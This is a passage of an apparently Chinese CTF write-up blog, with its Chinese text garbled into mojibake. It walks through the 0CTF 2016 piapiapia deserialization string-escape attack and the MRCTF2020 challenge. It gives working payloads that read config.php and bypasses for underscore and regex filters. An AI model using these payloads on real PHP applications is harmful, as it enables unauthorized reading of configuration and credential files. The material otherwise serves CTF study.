class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$profile</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>);<span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„ååºåˆ—åŒ–</span><br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„file_get_contentså‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨å…¶è¯»å–config.php</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡<code>$profile</code>è¿”å›æ•°ç»„ï¼Œç„¶åå¯¹æ•°ç»„é”®å€¼å¯¹è¿›è¡Œè¯»å–èµ‹å€¼ã€‚é‚£ä¹ˆå‰é¢è‚¯å®šæœ‰ä¸ªåºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬è·Ÿè¸ªåˆ°åºåˆ—åŒ–éƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">update_profile</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>));<span class="hljs-comment">//userå¯¹è±¡è®¿é—®update_profileæ–¹æ³•ï¼Œå­˜åœ¨åºåˆ—åŒ–</span><br><span class="hljs-comment">//update_profile:</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-comment">//update</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥æŠ“ä¸ªåŒ…çœ‹ä¸‹æˆ‘ä»¬<code>update</code>çš„æ•°æ®æ˜¯æ€ä¹ˆä¼ é€’çš„ï¼š</p><p><img src="/img/pia2.png" alt="pia2"></p><p>ç°åœ¨æ€è·¯å°±æ¸…æ™°äº†ï¼š<code>POST</code>ä¼ é€’æˆ‘ä»¬è¦æ›´æ–°çš„æ•°æ®(<code>phone,email,nickname,photo</code>)å¹¶è½¬æ¢æˆæ•°ç»„å½¢å¼(æ³¨æ„è¿™é‡Œè®¾ç½®äº†<code>waf</code>)ï¼Œ<code>photo</code>ä¼šé€šè¿‡<code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;])</code>å’Œ<code>move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload/&#39; . md5($file[&#39;name&#39;]))</code>ä¸Šä¼ åˆ°æŸä¸ªä½ç½®ï¼Œç„¶ååˆ©ç”¨<code>base64_encode(file_get_contents($profile[&#39;photo&#39;])</code>è¯»å–ã€‚</p><p>çœ‹ä¸‹è®¾ç½®çš„<code>waf</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­£åˆ™åŒ¹é…çš„è¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ æ•°ç»„ç»•è¿‡ï¼Œæ¯”å¦‚<code>nickname[]=ç‚¹ç‚¹ç‚¹</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;zhengze.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æœªæˆåŠŸç»•è¿‡ï¼&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;æˆåŠŸç»•è¿‡ï¼&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>/?nickname=[]=;&#125;å³å¯</code></p><p>åé¢æ€è·¯å°±æ˜¯é€šè¿‡æ„é€ ç‰¹æ®Šçš„<code>nickname</code>è®©ç³»ç»Ÿåœ¨åºåˆ—åŒ–-ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¿½ç•¥çœŸæ­£çš„<code>photo</code>ï¼Œå»è¯»<code>config.php</code></p><p>ä¸¾ä¸ªæ —å­(å‚è€ƒ<code>https://mayi077.gitee.io/2020/02/01/0CTF-2016-piapiapia/</code>)ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$profile</span> = a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;12345678901&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ss@q.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;sea_sand&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>));<br><br>ç»“æœå¦‚ä¸‹ï¼š<br><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [phone] =&gt; <span class="hljs-number">12345678901</span><br>    [email] =&gt; ss@q.com<br>    [nickname] =&gt; sea_sand<br>    [photo] =&gt; config.php<br>)<br><span class="hljs-comment">//å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–ä¹‹åï¼Œæœ€åé¢uploadè¿™ä¸€éƒ¨åˆ†å°±æ²¡äº†ï¼ˆä¹Ÿå¯ä»¥ç†è§£ä¸ºé—­åˆäº†ï¼‰ã€‚åæ‰äº†åé¢é‚£éƒ¨åˆ†ã€‚</span><br></code></pre></td></tr></table></figure><p>å…¶å®å¦‚æœä¸é™åˆ¶æ˜¯æ•°ç»„çš„è¯æˆ‘ä»¬æ„é€ <code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>ç„¶åé€šè¿‡å­—ç¬¦ä¸²æ›¿æ¢æŠŠè¿™æ®µåå‡ºå»å°±è¡Œï¼Œä¸è¿‡å› ä¸ºè¦æ˜¯æ•°ç»„çš„å½¢å¼ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ <code>â€;&#125;s:5:â€œphotoâ€;s:10:â€œconfig.phpâ€;&#125;</code>(å…¶å®å°±åœ¨åˆ†å·åå¤šäº†ä¸ª<code>&#125;</code>)</p><p>ç„¶ååˆ©ç”¨å­—ç¬¦ä¸²æ›¿æ¢æŠŠè¿™34ä¸ªå­—ç¬¦åå‡ºå»ï¼š<code>whereåˆ°hackerå¤šäº†ä¸€ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬éœ€è¦34ä¸ªwhere</code>:</p><p><code>payload:nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>ç»è¿‡åºåˆ—åŒ–æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">$profile = a<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;phone&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">11</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;12345678901&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;email&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ss@q.com&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;nickname&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">204</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;photo&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;config.php&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:39:&quot;</span>upload/<span class="hljs-number">804</span>f743824c0451b2f60d81b63b6a900<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>å› ä¸ºæ£€æµ‹åˆ°<code>where</code>ï¼Œå°†å…¶æ›¿æ¢æˆ<code>hacker</code>ï¼Œå˜æˆï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">$profile = a<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;phone&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">11</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;12345678901&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;email&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ss@q.com&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;nickname&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">204</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;photo&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;config.php&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;;&#125;  s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:39:&quot;</span>upload/<span class="hljs-number">804</span>f743824c0451b2f60d81b63b6a900<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æƒ³è¯´è¯´å…·ä½“æ€ä¹ˆæ¥çš„ï¼š<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>ã€‚å› ä¸ºæ•°ç»„çš„å½¢å¼æˆ‘ä»¬éœ€è¦<code>&quot;;&#125;</code>é—­åˆ<code>nickname</code>çš„å°¾å·´ã€‚ååºåˆ—åŒ–â€åâ€å‡ºåä¼šåœ¨<code>s:10:&quot;config.php&quot;;&#125;</code>å†åŠ ä¸ª<code>&quot;;&#125;</code>å»é—­åˆæˆ‘ä»¬æ„é€ çš„æ•°ç»„ã€‚</p><p>å…¶å®è¿™ä¸ª<code>&quot;;&#125;</code>æœ‰æ²¡æœ‰éƒ½æ— æ‰€è°“çš„ï¼Œååºåˆ—åŒ–åˆ°ç¬¬ä¸€ä¸ª<code>&quot;;&#125;</code>å·²ç»ç»“æŸäº†ã€‚</p><p>ç„¶åæŠ“åŒ…ä¿®æ”¹ï¼š</p><p><img src="/img/pia3.png" alt="pia3"></p><p><img src="/img/pia4.png" alt="pia4"></p><p><img src="/img/pia5.png" alt="pia5"></p><h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æºç </span><br>&lt;!--<br><span class="hljs-comment">//1st</span><br><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]; <span class="hljs-comment">//è·å–å½“å‰é¡µé¢ URL ä¸­é—®å·åé¢çš„æŸ¥è¯¢å­—ç¬¦ä¸²éƒ¨åˆ†</span><br><br> <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>); <span class="hljs-comment">//ä¸å…è®¸å­˜åœ¨ä¸‹åˆ’çº¿æˆ–å…¶URLç¼–ç </span><br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to the next ~&quot;</span>; <span class="hljs-comment">//GETä¼ å‚b_u_p_t,ä¸è‹¥ç­‰äº23333ä¸”å¿…é¡»ä¸¥æ ¼åŒ¹é…23333æ‰è¿”å›trueï¼Œ^è¡¨ç¤ºå¼€å§‹%$è¡¨ç¤ºç»“æŸ</span><br>&#125;<br>!--&gt;<br></code></pre></td></tr></table></figure><p>æ¡ä»¶ä¸€å’Œæ¡ä»¶äºŒæ˜¯çŸ›ç›¾çš„ï¼Œä¸è¿‡ç”±äº<code>PHP</code>è¿™ç§ä¼Ÿå¤§çš„è¯­è¨€å­˜åœ¨è‚¯å®šå˜å¾—ä¸çŸ›ç›¾äº†ã€‚ç½‘ä¸Šæœäº†ä¸‹<code>substr_count</code>ç»•è¿‡ç»“æœç›´æ¥æŠŠ<code>wp</code>æœå‡ºæ¥äº†ã€‚ã€‚åé¢æƒ³äº†æƒ³è¿™ä¸ªä¸‹åˆ’çº¿çš„é—®é¢˜ï¼Œä¹‹å‰<code>newstarctf</code>åšè¿‡ä¸€é“ç±»ä¼¼çš„ï¼Œå¯ä»¥é€šè¿‡ä¸€äº›éæ³•å­—ç¬¦å»æ›¿æ¢è¿™ä¸ªä¸‹åˆ’çº¿<code>(https://www.freebuf.com/articles/web/213359.html)</code></p><p>ç»•è¿‡è¿™ä¸ª<code>_</code>ä¸»è¦æœ‰ä¸‰ç§æ–¹æ³•ï¼š</p><p>1.åˆ©ç”¨ç©ºæ ¼ã€‚</p><p>2.åˆ©ç”¨å°æ•°ç‚¹ã€‚</p><p>3.åˆ©ç”¨<code>[</code>ï¼ˆæ³¨æ„è¿™ä¸ªåªèƒ½åˆ©ç”¨ä¸€æ¬¡ï¼Œå½“PHPç‰ˆæœ¬å°äº8æ—¶ï¼Œä¸­æ‹¬å·ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼Œä½†æ˜¯ä¼šå‡ºç°è½¬æ¢é”™è¯¯å¯¼è‡´æ¥ä¸‹æ¥å¦‚æœè¯¥å‚æ•°åä¸­è¿˜æœ‰<code>éæ³•å­—ç¬¦</code>å¹¶ä¸ä¼šç»§ç»­è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼‰</p><p><code>/?b u p t </code>æˆ–<code>/?b.u.p.t</code></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ­£åˆ™åŒ¹é…çš„ç»•è¿‡ï¼Œ<code>0xGame</code>åšè¿‡ç±»ä¼¼çš„ï¼Œ<code>preg_match</code>è¿™ä¸œè¥¿åªä¼šåŒ¹é…ç¬¬ä¸€è¡Œï¼Œæ‰€ä»¥å¯ä»¥ç”¨<code>%0a</code>ç»•è¿‡ã€‚(<code>å‚è€ƒï¼šhttps://www.cnblogs.com/iwantflag/p/15262445.html</code>)</p><p>ç»¼ä¸Šæˆ‘ä»¬å¯ä»¥ä»¤<code>/?b u p t=23333%0a</code>ï¼š</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">how smart you <span class="hljs-keyword">are</span> ~<br><br>FLAG <span class="hljs-keyword">is</span> in secrettw.php<br></code></pre></td></tr></table></figure><p>è®¿é—®<code>secrettw.php</code>:</p><p><img src="/img/taowa1.png" alt="taowa1"></p><p>æç¤ºåªæœ‰æœ¬åœ°æ‰èƒ½è®¿é—®ï¼ŒæŠ“åŒ…åŠ ä¸ªå¤´<code>X-Forwarded-For:127.0.0.1</code>ï¼Œä¸è¿‡æ²¡æˆåŠŸï¼Ÿåé¢åˆå°è¯•<code>X-Real-IP/Client-IP</code>éƒ½æ²¡æˆåŠŸã€‚ã€‚å³é”®çœ‹æºç å‘ç°è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">&lt;!--<br><span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span 